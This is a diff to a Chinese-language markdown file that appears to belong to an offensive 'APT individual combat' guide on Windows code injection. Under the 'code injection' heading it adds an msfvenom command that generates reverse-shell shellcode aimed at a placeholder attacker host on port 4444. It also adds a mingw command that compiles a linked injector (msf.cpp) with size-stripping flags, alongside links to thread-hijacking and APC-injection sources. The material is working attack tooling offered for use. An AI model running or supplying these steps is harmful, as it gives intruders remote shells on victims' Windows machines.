@@ -436,6 +436,16 @@ x86_64-w64-mingw32-g++ -O2 msf.cpp -o msf.exe -mconsole -I /usr/share/mingw-w64/
 
 ## 代码注入
 
+```Bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者主机地址 LPORT=4444 -f c
+```
+
+[msf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/msf.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc msf.cpp -o msf.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
+
 ### 线程劫持
 
 [thread_hijacking.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/thread_hijacking.cpp)
@@ -559,3 +569,5 @@ x86_64-w64-mingw32-g++ ZwQueueApcThread.cpp -o ZwQueueApcThread.exe -mconsole -I
 2.
 
 [Zw_QueueApcThread.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Code_Injection/Zw_QueueApcThread.cpp)
+
+## DLL注入
